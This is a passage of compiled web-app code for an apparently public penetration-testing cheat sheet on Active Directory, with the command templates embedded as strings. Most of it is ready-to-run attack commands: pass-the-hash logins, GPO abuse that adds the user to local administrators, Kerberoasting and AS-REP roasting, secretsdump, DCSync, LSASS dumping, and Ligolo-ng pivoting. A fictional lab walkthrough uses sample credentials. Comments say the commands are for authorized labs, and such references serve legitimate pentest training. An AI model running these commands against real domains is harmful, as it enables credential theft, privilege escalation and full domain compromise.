evil-winrm -i {{TARGET_IP}} -u '<DOMAIN>\\<USER>' -p '<PASSWORD>'

# If the approved credential is an NTLM hash instead of a password
evil-winrm -i {{TARGET_IP}} -u '<DOMAIN>\\<USER>' -H <NTLM_HASH>
`;attackDcom=String.raw`# DCOM is a remote-execution option, not a privilege-escalation technique.
# Requires authorized credentials, remote DCOM rights and RPC reachability.

# Enumerate DCOM applications and registered COM identifiers
Get-CimInstance Win32_DCOMApplication
Get-ChildItem HKLM:\Software\Classes\AppID
Get-ChildItem HKLM:\Software\Classes\CLSID

# Controlled validation using MMC20.Application on an authorized lab host
$dcom = [System.Activator]::CreateInstance(
  [type]::GetTypeFromProgID("MMC20.Application.1", "<TARGET_HOST>")
)
$dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c whoami", "7")

# Method selection depends on target permissions and network policy:
# SMB + local admin -> PsExec; WinRM rights -> WinRM;
# WMI permissions -> WMI; DCOM permissions + RPC -> DCOM.
# Commands execute as the supplied identity; verify the resulting context.
`;gpoEnumeration=String.raw`# List every GPO in the domain and who can edit it
Get-DomainGPO | select displayname, gpcfilesyspath

# Resolve which OUs / users / computers a given GPO applies to
Get-DomainOU | Get-DomainGPO -ResolveLinks | select displayname

# Find GPOs the current user can modify (GenericWrite / WriteProperty / WriteDacl)
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | ? {
  $_.SecurityIdentifier -match $(ConvertTo-SID '<CURRENT_USER>')
}

# BloodHound: look for "WriteGPLink" / "GPLink" / GenericAll on OU edges
# and for Users/Computers in scope of a modifiable GPO
`;gpoAbuseSharpGpo=String.raw`# SharpGPOAbuse adds a malicious computer/user startup task to a GPO the
# compromised principal can already edit, then forces policy refresh.

SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" \
  --Author <DOMAIN>\<USER> \
  --Command "cmd.exe" \
  --Arguments "/c net localgroup administrators <DOMAIN>\\<USER> /add" \
  --GPOName "<TARGET_GPO_NAME>"

# On the target (or wait for the ~90-120 min default refresh interval)
gpupdate /force

# Verify the new local administrator on an affected computer
net localgroup administrators
`;gpoImmediateTask=String.raw`# Alternative: push a GPO "Immediate Task" via PowerView when SharpGPOAbuse
# is not available (requires GenericWrite/WriteProperty on the GPO object)

New-GPOImmediateTask -TaskName "Updater" -Command "cmd.exe" \
  -CommandArguments "/c net localgroup administrators <DOMAIN>\\<USER> /add" \
  -GPOname "<TARGET_GPO_NAME>" -Force

# Always confirm GPO scope (linked OU, enforced/blocked inheritance,
# WMI/security filtering) before relying on this to affect a specific host
gpresult /r
`;postChecklistQuick=String.raw`# Use after authorized Administrator or SYSTEM access on a domain host.
# Record findings, avoid unnecessary configuration changes and protect secrets.
# [ ] Active sessions       [ ] LSASS / Kerberos
# [ ] DPAPI / Credential Manager / profiles
# [ ] Scheduled tasks / services / application configs
# [ ] Certificates / BloodHound / delegation / LAPS
# [ ] Validate credentials only against approved targets
# [ ] Document impact and complete engagement cleanup
`;postChecklistSessions=String.raw`# Identify the current user and active interactive sessions
whoami /all
query user
qwinsta
quser
tasklist /v

# With authorized SMB credentials, review sessions on a scoped host
nxc smb <TARGET> -u <USER> -p '<PASSWORD>' --sessions

# Prioritize investigation of unexpected privileged, service,
# backup-operator or other-user sessions; follow the approved process.
`;postChecklistCredentials=`# Use the Credential Access section for detailed LSASS and ticket commands.
# Review DPAPI-protected data, Credential Manager and Windows Vault where
# authorized. Results depend on the user context and available master keys.
cmdkey /list
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials"
`;postChecklistHostAudit=`# Review accessible user profiles and common file types for configuration exposure.
dir %USERPROFILE%
dir C: /s *.rdp
dir C: /s *.ps1
dir C: /s *.xml
dir C: /s *.config
dir C: /s *.ini

# Scheduled tasks and services
schtasks /query /fo LIST /v
wmic service get Name,DisplayName,StartName,PathName
Get-CimInstance Win32_Service | Select-Object Name,StartName,PathName

# Inspect configuration files, service permissions and registry entries
sc qc <SERVICE_NAME>
icacls "<SERVICE_DIRECTORY>"
findstr /spin "password passwd pwd secret token connectionstring user uid" *.config *.xml *.ini *.txt
reg query HKLMSYSTEMCurrentControlSetServices<SERVICE_NAME>

# Identify custom service accounts and investigate only approved paths.
`;postChecklistDirectory=String.raw`# Review local machine and user certificate stores
certutil -store My
certutil -user -store My

# Collect relationship data only when authorized and within scope
SharpHound.exe -c All
bloodhound-python -u <USER> -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c All

# Inspect Kerberos tickets and delegation
klist
Rubeus.exe triage
Rubeus.exe dump
Get-DomainComputer -Unconstrained
Get-DomainComputer -TrustedToAuth

# Read LAPS data only where the account has permission
Get-LapsADPassword
nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --query "(objectClass=computer)" "ms-Mcs-AdmPwd"

# Review BloodHound computer objects, sessions, ACLs, delegation,
# group membership and ReadLAPSPassword relationships.
`;postChecklistDecision=String.raw`# Choose the next validation path based on credential type and scope.
# Password: validate against approved SMB / WinRM / RDP targets.
# NTLM hash: use an approved Pass-the-Hash method where permitted.
# AES key: assess a Kerberos Pass-the-Key path.
# Kerberos ticket: verify identity, service, target and expiry with klist;
# use the ticket only for the matching authorized service.
# No usable credential: continue host, file, service and directory enumeration.

# If a new host is reached, record its context and restart this checklist.
# Before leaving: confirm profiles, DPAPI, Vault, tickets, tasks,
# services, certificates, BloodHound, scripts/configs and lateral paths reviewed.
# Redact secrets in notes and follow evidence-retention / cleanup requirements.
`;forestRecon=String.raw`# Set the retired HTB Forest target address
export TARGET_IP=<FOREST_IP>

# Identify exposed services and versions
nmap -Pn -n -p 53,88,135,139,389,445,464,636,3268,3269,5985,9389 -sC -sV "$TARGET_IP"

# Check for anonymously accessible SMB shares and LDAP users
nxc smb "$TARGET_IP" -u '' -p '' --shares
nxc ldap "$TARGET_IP" -u '' -p '' --users`;forestLdapAudit=String.raw`# Query the HTB.LOCAL naming context for users configured without Kerberos pre-authentication.
# This is a directory configuration audit; it does not request or crack tickets.
ldapsearch -x -H "ldap://$TARGET_IP" -b "DC=htb,DC=local" \
  '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  sAMAccountName userAccountControl

# Expected account to investigate in the retired lab: svc-alfresco`;forestDirectoryReview=String.raw`# Run from an authorized, domain-joined Windows session with the ActiveDirectory module
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Identity svc-alfresco -Properties MemberOf,UserAccountControl
Get-ADGroupMember -Identity "Account Operators" -Recursive
Get-ADGroupMember -Identity "Exchange Windows Permissions" -Recursive

# Review effective directory relationships and ACLs in BloodHound.
# Replace placeholders with the lab account and collect only approved data.
bloodhound-python -d htb.local -u '<USER>' -p '<PASSWORD>' \
  -dc forest.htb.local -c Group,ACL`;activeRecon=String.raw`# Set the retired HTB Active target address
export TARGET_IP=<ACTIVE_IP>

# Identify exposed services and versions
nmap -Pn -n -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV "$TARGET_IP"

# List SMB shares with a null session
smbclient -N -L "//$TARGET_IP"

# Review directory and file names in the readable Replication share
# This lists names only; it does not download or display file contents.
smbclient -N "//$TARGET_IP/Replication" -c 'recurse;ls'`;activeGpoAudit=String.raw`# Run on a domain-joined Windows system with authorized access to SYSVOL
# Inventory Group Policy Preference XML files without printing their contents.
Get-ChildItem '\\active.htb\SYSVOL\active.htb\Policies' -Recurse -File -Filter '*.xml' |
  Select-Object FullName, Length, LastWriteTime

# Review GPO inventory and security filtering through standard AD read operations
Import-Module GroupPolicy
Get-GPO -All -Domain 'active.htb' |
  Select-Object DisplayName, Id, GpoStatus, ModificationTime`;flowScan=`
# Full TCP port scan
sudo nmap -p- --open -sS -n -Pn TARGET_IP -oN openPorts

# Review discovered ports
cat openPorts
`;flowServices=`
# Enumerate discovered services and default scripts
nmap -sCV -p PORTS -n -Pn TARGET_IP -oN services

# Common Active Directory ports
# 53    DNS
# 88    Kerberos
# 135   MSRPC
# 139   NetBIOS
# 389   LDAP
# 445   SMB
# 464   Kerberos password change
# 636   LDAPS
# 3268  Global Catalog
# 3389  RDP
# 5985  WinRM
# 1433  MSSQL
`;flowWinRM=`
# Connect to an authorized lab host using valid credentials
evil-winrm -i TARGET_IP -u USER -p 'PASSWORD'
`;flowHostEnumeration=`
# Identify the current user and security context
whoami
whoami /all
whoami /priv
whoami /groups

# Identify the host
hostname
systeminfo

# Review network configuration
ipconfig /all
route print

# Review local users and groups
net user
net localgroup
net localgroup Administrators
`;flowPrivEscChecks=`
# Check current security privileges
whoami /priv
whoami /groups

# Review operating system details
systeminfo

# Inspect services
Get-Service

# Review scheduled tasks
schtasks /query /fo LIST /v
`;flowPrivEscReview=`
# Privilege escalation review checklist
# 1. Identify enabled token privileges.
# 2. Review service permissions and service paths.
# 3. Inspect scheduled tasks and their permissions.
# 4. Check writable directories and executable paths.
# 5. Review installed software and applicable patches.
# 6. Search for exposed configuration files and credentials.
# 7. Validate each finding only in the authorized lab.
# 8. Record evidence and the resulting security context.
`;flowPostCompromise=`
# Confirm the current identity and privilege level
whoami
whoami /all

# Review local administrators
net localgroup Administrators

# Review domain groups
net group /domain

# Review domain users
net user /domain

# Review current logon sessions
query user
qwinsta

# Inspect locally available Kerberos tickets
klist
`;flowCredentialAudit=`
# Credential exposure assessment
# Review the following sources within the authorized scope:
#
# - Application configuration files
# - Scripts containing embedded credentials
# - PowerShell history
# - Windows services and scheduled task configurations
# - Unattended installation files
# - Accessible shares and backup files
#
# Treat passwords, hashes, tickets and secret material as sensitive.
# Do not export or retain credentials outside the approved lab scope.
`;flowKerberosAudit=`
# Enumerate SPNs registered to a domain user
setspn -L USER

# Find domain users with registered SPNs using PowerView
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname

# Review the current Kerberos ticket cache
klist

# Review delegation and privileged-account exposure.
# Use approved directory auditing tools to inspect:
# - Unconstrained delegation
# - Constrained delegation
# - Resource-based constrained delegation
# - Privileged group membership
# - Replication-related directory permissions
`;flowMssqlAudit=`
# MSSQL security assessment checklist
#
# 1. Identify reachable SQL Server instances.
# 2. Verify which account is used for authentication.
# 3. Review server roles and database permissions.
# 4. Check whether the account has excessive privileges.
# 5. Review linked servers and delegation configuration.
# 6. Check whether dangerous features are enabled unnecessarily.
# 7. Document evidence and recommended remediation.
#
# Perform testing only against explicitly authorized instances.
`;flowPivotEnumeration=`
# On the Windows pivot host
ipconfig /all
route print

# Identify the network interfaces and reachable subnets.
# Record the pivot host IP and the target subnet before
# configuring the tunnel.
`;flowLigolo=`
# Start the Ligolo-ng proxy on the authorized testing machine
sudo ./proxy -selfcert

# Start the Ligolo-ng agent on the authorized pivot host
# Use the proxy address and port configured for your lab.
# Example agent invocation:
./agent -connect PROXY_IP:11601 -ignore-cert

# After the agent connects:
# 1. Select the connected session (session <SESSION_ID>).
# 2. Start the tunnel (start).
# 3. Configure the route to the lab subnet (autoroute where supported;
#    otherwise configure the TUN interface and OS route).
# 4. Verify reachability before scanning (ping <INTERNAL_HOST_IP>).
#
# Consult the Ligolo-ng documentation for platform-specific route setup.
`;flowPostPivot=`
# Scan a newly reachable lab host
sudo nmap -p- --open -sS -n -Pn TARGET_IP -oN pivotPorts

# Enumerate discovered services
nmap -sCV -p PORTS -n -Pn TARGET_IP -oN pivotServices

# Reassess each host
# - Identify the operating system and exposed services.
# - Enumerate domain membership and available shares.
# - Validate access using approved lab credentials.
# - Review SQL Server and other application services.
# - Update the network map and document findings.
#
# Do not assume that credentials valid on one host
# should be reused on another without authorization.
`;examplePowerShellHistory=`
# Review the PowerShell history left by a previous administrative session
type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt

# Fictional lab finding recovered from the history file:
# net use \\\\APP02\\C$ /user:CORP\\svc_backup "B4ckup$2024!"
#
# The history only reveals a credential; it does not grant privileges
# by itself. Validate real escalation paths with the Windows PrivEsc guide.
`;exampleWebToAppPivot=`
# WEB01 (DMZ, 10.10.10.21) can reach the internal 10.10.20.0/24 segment
# that is not directly reachable from Kali. Pivot through WEB01 first.

# Start the Ligolo-ng proxy on Kali
sudo ./proxy -selfcert

# Upload and run the Windows agent on WEB01, connecting back to Kali
./agent.exe -connect KALI_IP:11601 -ignore-cert

# On the Ligolo-ng proxy console
session       # select the WEB01 session
start         # open the tunnel

# Add the route to the internal segment on Kali
sudo ip route add 10.10.20.0/24 dev ligolo
`;exampleApp02Login=`
# Through the WEB01 tunnel, connect to APP02 with the credential
# recovered from the PowerShell history
evil-winrm -i 10.10.20.22 -u svc_backup -p 'B4ckup$2024!'
`;exampleApp02CredentialFinding=`
# APP02 grants svc_backup the SeBackupPrivilege / SeRestorePrivilege tokens
whoami /priv

# Use the existing SeBackup/SeRestore technique (Windows PrivEsc) to dump
# the local SAM/SYSTEM hives and recover cached credential material
reg save HKLM\\SAM C:\\Temp\\SAM
reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Fictional lab finding inside the recovered Credential Manager vault:
# CORP\\svc_adcs : "C3rtSvc#2024!"
# svc_adcs is later confirmed to hold "Replicating Directory Changes"
# rights once APP03 is reached.
`;exampleApp03Login=`
# Through the second tunnel (APP02 -> APP03), connect with the
# svc_adcs credential recovered on APP02
evil-winrm -i 10.10.30.23 -u svc_adcs -p 'C3rtSvc#2024!'
`;exampleDcsyncFinding=`
# Confirm svc_adcs effective replication rights before running DCSync
impacket-secretsdump CORP.LOCAL/svc_adcs:'C3rtSvc#2024!'@10.10.10.10 -just-dc

# Fictional lab finding (redact/rotate in a real engagement):
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:...:::
#
# Local Administrator membership alone does not grant DCSync; the
# directory replication rights are what make this step possible.
`;linuxAdInitialScan=String.raw`# Full TCP port scan; save open ports for the follow-up command
  nmap -p- --min-rate 5000 -T4 <IP> -oN openPorts

# Service and version detection
nmap -sCV -p <ports> <IP>

# Parse openPorts and scan discovered services
nmap -sCV -p $(grep "^[0-9]" openPorts | awk '{print $1}' | cut -d'/' -f1 | paste -sd,) <IP> -oN services

# Important AD ports
# 88   Kerberos
# 389  LDAP
# 445  SMB
# 5985 WinRM
# 3268 Global Catalog`;linuxAdNoCredentials=String.raw`# RPC enumeration
rpcclient -U "" -N <IP>
# Inside rpcclient:
enumdomusers
querydispinfo

# SMB anonymous enumeration
smbclient -L //<IP> -N
smbclient //<IP>/<Share> -N
crackmapexec smb <IP> --shares -u '' -p ''
crackmapexec smb <IP> -u 'a' -p '' -d 'domain.com' --rid-brute
crackmapexec smb <IP> -u 'a' -p '' -d 'domain.com' --rid-brute | grep 'SidTypeUser' | awk -F'\\\\' '{print $2}' | awk '{print $1}' > users.txt
enum4linux -a <IP>
enum4linux -u 'domain.com\\guest' -a <IP>
smbmap -u anonymous -H <IP>

# LDAP anonymous: discover Base DN
ldapsearch -x -H ldap://<IP> -s base

# Anonymous LDAP enumeration
ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=com"

# Extract domain usernames
ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=com" -s sub "(&(objectClass=user))" | grep sAMAccountName: | cut -f2 -d" "

# Search user descriptions and other attributes for exposed credentials
ldapsearch -x -H ldap://<IP> -b "DC=corp,DC=com" "(objectClass=user)" description

# Authenticated LDAP query
ldapsearch -x -H ldap://<IP> -D "user@corp.com" -w '<PASSWORD>' -b "DC=corp,DC=com"

# Enumerate computer objects and check readable LAPS attributes
ldapsearch -x -H ldap://<IP> -D "user@corp.com" -w '<PASSWORD>' -b "DC=corp,DC=com" "(objectClass=computer)" dNSHostName ms-Mcs-AdmPwd

# Kerberos username enumeration
kerbrute userenum -d corp.com users.txt --dc <IP>

# AS-REP roasting
impacket-GetNPUsers corp.com/ -no-pass -usersfile users.txt -dc-ip <IP>

# Crack AS-REP hashes
hashcat -m 18200 hashes.txt rockyou.txt

# DNS zone transfer
dig axfr corp.com @<IP>`;linuxAdWithCredentials=String.raw`# Validate credentials
crackmapexec smb <IP> -u user -p '<PASSWORD>' -d corp.com

# Password policy
crackmapexec smb <IP> -u user -p '<PASSWORD>' --pass-pol

# Check whether any listed account accepts an empty password
nxc smb <IP> -u users.txt -p '' --continue-on-success

# Change an expired or must-change password when authorized
impacket-changepasswd domain/user@<DC_IP> -newpass '<NEW_PASSWORD>'

# Enumerate SMB shares
crackmapexec smb <IP> -u user -p '<PASSWORD>' --shares

# Enumerate domain SIDs and users
impacket-lookupsid domain/user:'<PASSWORD>'@<IP>
impacket-lookupsid domain.local/ -no-pass
impacket-lookupsid domain.local/guest@<IP> -no-pass
impacket-lookupsid anonymous@<IP>

# Access SYSVOL
smbclient //dc1/SYSVOL -U 'domain.htb/user%<PASSWORD>'
smbclient //dc1/SYSVOL -U user -c "recurse ON; prompt OFF; ls"

# Access shares
smbclient //<IP>/<Share> -U 'user%<PASSWORD>'
smbmap -H <IP> -u user -p '<PASSWORD>'
smbmap -H <IP> -u user -p '<PASSWORD>' -r <Share>

# Enumerate domain users
impacket-GetADUsers corp.com/user:'<PASSWORD>' -dc-ip <IP>

# Enumerate computer objects
ldapsearch -x -H ldap://<IP> -D "user@corp.com" -w '<PASSWORD>' -b "DC=corp,DC=com" "(objectClass=computer)" dNSHostName operatingSystem

# Kerberoasting
impacket-GetUserSPNs corp.com/user:'<PASSWORD>' -dc-ip <IP> -request

# Crack Kerberoast hashes
hashcat -m 13100 hashes.txt rockyou.txt

# BloodHound collection
bloodhound-python -u user -p '<PASSWORD>' -d corp.com -dc dc1.corp.com -c all

# Check local administrator access across a subnet
crackmapexec smb 192.168.1.0/24 -u user -p '<PASSWORD>' -d corp.com
crackmapexec smb 192.168.1.0/24 -u user -p '<PASSWORD>' -d corp.com --local-auth

# Enumerate active SMB sessions
crackmapexec smb <IP> -u user -p '<PASSWORD>' --sessions`;linuxAdLateralMovement=String.raw`# WinRM - password
evil-winrm -i <IP> -u user -p '<PASSWORD>'

# WinRM - domain formats
evil-winrm -i <IP> -u 'corp\\user' -p '<PASSWORD>'
evil-winrm -i <IP> -u user@corp.com -p '<PASSWORD>'

# WinRM - Pass the Hash
evil-winrm -i <IP> -u user -H <NTLM_HASH>

# WMI execution
impacket-wmiexec corp.com/user:'<PASSWORD>'@<IP>
impacket-wmiexec user:'<PASSWORD>'@<IP>

# PsExec - requires administrative access
impacket-psexec corp.com/user:'<PASSWORD>'@<IP>
impacket-psexec user:'<PASSWORD>'@<IP>

# Pass the Hash with WMI
impacket-wmiexec -hashes :<NTLM_HASH> user@<IP>

# Pass the Hash with PsExec
impacket-psexec -hashes :<NTLM_HASH> Administrator@<IP>

# Validate an NTLM hash
crackmapexec smb <IP> -u user -H <NTLM_HASH>

# Validate credentials across a subnet
crackmapexec smb 192.168.1.0/24 -u user -p '<PASSWORD>' -d corp.com

# Decision guide
# 5985/5986 open + authorized user -> WinRM
# SMB + local admin privileges -> PsExec
# WinRM unavailable, SMB available -> consider WMI
# NTLM hash available -> test authorized Pass-the-Hash options`;linuxAdCredentialDumping=String.raw`# Remote credential dumping - requires sufficient privileges
impacket-secretsdump corp.com/user:'<PASSWORD>'@<IP>

# Extract local SAM hashes from collected hives
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Extract NTDS hashes from collected files
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Extract LSA secrets from collected hives
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL

# NetExec: SAM
nxc smb <IP> -u user -p '<PASSWORD>' --sam

# NetExec: LSA secrets
nxc smb <IP> -u user -p '<PASSWORD>' --lsa

# NetExec: LSASS
nxc smb <IP> -u user -p '<PASSWORD>' -M lsassy

# NetExec: NTDS - requires replication privileges
nxc smb <DC_IP> -u user -p '<PASSWORD>' --ntds

# NetExec: LAPS - requires permission to read the relevant attributes
nxc smb <IP> -u user -p '<PASSWORD>' -M laps

# NetExec: gMSA - requires appropriate directory permissions
nxc ldap <DC_IP> -u user -p '<PASSWORD>' --gmsa

# NetExec: enumerate sessions and logged-on users
nxc smb <IP> -u user -p '<PASSWORD>' --sessions
nxc smb <IP> -u user -p '<PASSWORD>' --loggedon-users

# Search accessible shares for interesting files
nxc smb <IP> -u user -p '<PASSWORD>' -M spider_plus

# Download files discovered by spider_plus
nxc smb <IP> -u user -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True

# Crack cached domain credentials where applicable
john --wordlist=rockyou.txt --format=mscash2 hash.txt

# DCSync - requires domain replication rights
impacket-secretsdump -just-dc-user administrator corp.com/user:'<PASSWORD>'@<DC_IP>
impacket-secretsdump -just-dc corp.com/user:'<PASSWORD>'@<DC_IP>

# Offline analysis of an LSASS dump
pypykatz lsa minidump lsass.dmp

# Search common locations for stored credentials on an authorized Windows host
# PowerShell history:
# %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
#
# Common files:
# *.config, *.xml, *.ini, *.txt, web.config, Unattend.xml, sysprep.xml
#
# Group Policy Preferences:
# Search SYSVOL XML files for the cpassword attribute
#
# Credential Manager:
# cmdkey /list
# vaultcmd /list`;static \u0275fac=function(o){return new(o||s)};static \u0275cmp=P({type:s,selectors:[["app-active-directory"]],decls:34,vars:22,consts:[[1,"common-services-page","active-directory-page"],[1,"page-header"],[1,"terminal-path"],[1,"prompt"],[1,"title"],[1,"page-description"],[1,"section-workspace"],[1,"section-workspace__index",3,"sectionChange","items","activeId"],[1,"section-workspace__content"],[1,"detail"],[4,"ngIf"],[1,"section-description"],[3,"command"],[3,"opened","closed","expanded"],["multi",""],["routerLink","/web",1,"workflow-link",3,"queryParams"],["routerLink","/privesc",1,"workflow-link",3,"queryParams"],["routerLink","/ad",1,"workflow-link",3,"queryParams"]],template:function(o,c){o&1&&(n(0,"div",0)(1,"div",1)(2,"div",2)(3,"span",3),t(4,"~/get.sh/"),e(),t(5,"active-directory "),e(),n(6,"h1",4),t(7,"Active Directory"),e(),n(8,"p",5),t(9," Domain enumeration, object permissions, sessions and relationship analysis for Active Directory assessments. "),e()(),n(10,"div",6)(11,"app-section-index",7),v("sectionChange",function(U){return c.selectService(U)}),e(),n(12,"div",8)(13,"div",9),f(14,V,15,2,"ng-container",10)(15,j,20,3,"ng-container",10)(16,Q,20,3,"ng-container",10)(17,Y,20,3,"ng-container",10)(18,$,30,5,"ng-container",10)(19,Z,20,3,"ng-container",10)(20,X,38,7,"ng-container",10)(21,J,49,8,"ng-container",10)(22,ee,50,9,"ng-container",10)(23,te,30,5,"ng-container",10)(24,ne,26,5,"ng-container",10)(25,ae,10,1,"ng-container",10)(26,ie,25,3,"ng-container",10)(27,oe,15,2,"ng-container",10)(28,re,79,27,"ng-container",10)(29,se,31,6,"ng-container",10)(30,ce,114,27,"ng-container",10)(31,le,69,9,"ng-container",10)(32,pe,56,8,"ng-container",10)(33,de,31,5,"ng-container",10),e()()()()),o&2&&(a(11),i("items",c.sections)("activeId",c.selectedService??""),a(3),i("ngIf",c.selectedService==="windows"),a(),i("ngIf",c.selectedService==="powerview"),a(),i("ngIf",c.selectedService==="manual"),a(),i("ngIf",c.selectedService==="spn"),a(),i("ngIf",c.selectedService==="acl"),a(),i("ngIf",c.selectedService==="shares"),a(),i("ngIf",c.selectedService==="bloodhound"),a(),i("ngIf",c.selectedService==="credentials"),a(),i("ngIf",c.selectedService==="kerberos"),a(),i("ngIf",c.selectedService==="passwords"),a(),i("ngIf",c.selectedService==="adcs"),a(),i("ngIf",c.selectedService==="dcom"),a(),i("ngIf",c.selectedService==="gpo-abuse"),a(),i("ngIf",c.selectedService==="compromise"),a(),i("ngIf",c.selectedService==="ad-flow"),a(),i("ngIf",c.selectedService==="post-exploitation-checklist"),a(),i("ngIf",c.selectedService==="ad-example-three-host"),a(),i("ngIf",c.selectedService==="forest-writeup"),a(),i("ngIf",c.selectedService==="active-writeup"),a(),i("ngIf",c.selectedService==="full-ad-compromise-linux"))},dependencies:[w,b,M,O,k,_,R,I,L,D],styles:[".common-services-page.active-directory-page[_ngcontent-%COMP%]{padding:2rem;color:#e2e8f0;max-width:1200px;margin:0 auto;box-sizing:border-box}.active-directory-page[_ngcontent-%COMP%]   .page-header[_ngcontent-%COMP%]{margin-bottom:2rem}.active-directory-page[_ngcontent-%COMP%]   .terminal-path[_ngcontent-%COMP%]{margin-bottom:.5rem;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:13px;color:#64748b}.active-directory-page[_ngcontent-%COMP%]   .terminal-path[_ngcontent-%COMP%]   .prompt[_ngcontent-%COMP%]{color:#38bdf8}.active-directory-page[_ngcontent-%COMP%]   .title[_ngcontent-%COMP%]{font-size:30px;font-weight:700;margin:0 0 .5rem;color:#f8fafc}.active-directory-page[_ngcontent-%COMP%]   .page-description[_ngcontent-%COMP%]{margin:0;color:#64748b;font-size:14px;line-height:1.6;max-width:760px}.active-directory-page[_ngcontent-%COMP%]   .section-header[_ngcontent-%COMP%]{display:flex!important;align-items:center!important;gap:1rem!important;width:100%!important;margin:2.5rem 0 1.5rem!important;box-sizing:border-box!important}.active-directory-page[_ngcontent-%COMP%]   .section-header[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{display:block!important;flex:0 0 auto!important;margin:0!important;padding:0!important;color:#e2e8f0!important;font-family:inherit!important;font-size:.85rem!important;font-weight:600!important;line-height:1.5!important;letter-spacing:.12em!important;text-transform:uppercase!important;white-space:nowrap!important;background:transparent!important;border:none!important}.active-directory-page[_ngcontent-%COMP%]   .section-header[_ngcontent-%COMP%]   .section-line[_ngcontent-%COMP%]{display:block!important;flex:1 1 0!important;min-width:0!important;height:1px!important;padding:0!important;background:#1e293b!important;border:none!important;opacity:1!important}.active-directory-page[_ngcontent-%COMP%]   .grid[_ngcontent-%COMP%]{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:1rem}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]{display:flex;align-items:flex-start;gap:1rem;height:100%;min-height:130px;padding:1.25rem;box-sizing:border-box;background:#111827;border:1px solid #1e293b;border-radius:12px;cursor:pointer;transition:transform .2s ease,border-color .2s ease,background .2s ease,box-shadow .2s ease}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]:hover{transform:translateY(-4px);border-color:#2563eb;background:#172033;box-shadow:0 8px 25px #00000040,0 0 15px #2563eb14}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]:focus-visible{outline:2px solid #38bdf8;outline-offset:3px}.active-directory-page[_ngcontent-%COMP%]   .card-icon[_ngcontent-%COMP%]{flex-shrink:0;width:46px;height:46px;display:flex;align-items:center;justify-content:center;box-sizing:border-box;border-radius:10px;background:#0b1220;border:1px solid #1e3a5f;color:#38bdf8;font-family:JetBrains Mono,Fira Code,Consolas,monospace;font-size:16px;font-weight:700;transition:border-color .2s ease,color .2s ease,background .2s ease}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]:hover   .card-icon[_ngcontent-%COMP%]{border-color:#2563eb;color:#60a5fa;background:#0f172a}.active-directory-page[_ngcontent-%COMP%]   .card-content[_ngcontent-%COMP%]{min-width:0}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0 0 .45rem;color:#f8fafc;font-size:17px;font-weight:650;line-height:1.4}.active-directory-page[_ngcontent-%COMP%]   .card[_ngcontent-%COMP%]   p[_ngcontent-%COMP%]{margin:0;color:#64748b;font-size:13px;line-height:1.6}.active-directory-page[_ngcontent-%COMP%]   .detail[_ngcontent-%COMP%]{display:flex;flex-direction:column;gap:1rem;min-width:0}.active-directory-page[_ngcontent-%COMP%]   .detail[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0;font-size:30px;font-weight:700;line-height:1.3;color:#f8fafc}.active-directory-page[_ngcontent-%COMP%]   .section-description[_ngcontent-%COMP%]{margin:-.5rem 0 1rem;color:#94a3b8;font-size:14px;line-height:1.7;max-width:900px}.active-directory-page[_ngcontent-%COMP%]   .section-description[_ngcontent-%COMP%]   code[_ngcontent-%COMP%]{color:#38bdf8;font-family:JetBrains Mono,Fira Code,Consolas,monospace}.active-directory-page[_ngcontent-%COMP%]   .back[_ngcontent-%COMP%]{display:inline-flex;align-items:center;gap:.5rem;width:fit-content;max-width:100%;padding:9px 13px;background:transparent;border:1px solid #334155;border-radius:8px;color:#e2e8f0;font-size:13px;font-family:inherit;cursor:pointer;transition:background .2s ease,border-color .2s ease,color .2s ease}.active-directory-page[_ngcontent-%COMP%]   .back[_ngcontent-%COMP%]:hover{background:#1e293b;border-color:#3b82f6;color:#60a5fa}.active-directory-page[_ngcontent-%COMP%]   .back[_ngcontent-%COMP%]:focus-visible{outline:2px solid #38bdf8;outline-offset:3px}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel[_ngcontent-%COMP%]{background:#1e293b!important;color:#e2e8f0!important;border-radius:10px!important;margin-bottom:10px;border:1px solid #334155;box-shadow:none!important;overflow:hidden}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]{color:#e2e8f0!important;background:transparent!important;min-height:52px;padding:0 16px;transition:background .2s ease}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]:hover{background:#243449!important}.active-directory-page[_ngcontent-%COMP%]   mat-panel-title[_ngcontent-%COMP%]{color:#e2e8f0!important;font-size:14px;font-weight:600;line-height:1.5}.active-directory-page[_ngcontent-%COMP%]   mat-expansion-panel-header[_ngcontent-%COMP%]   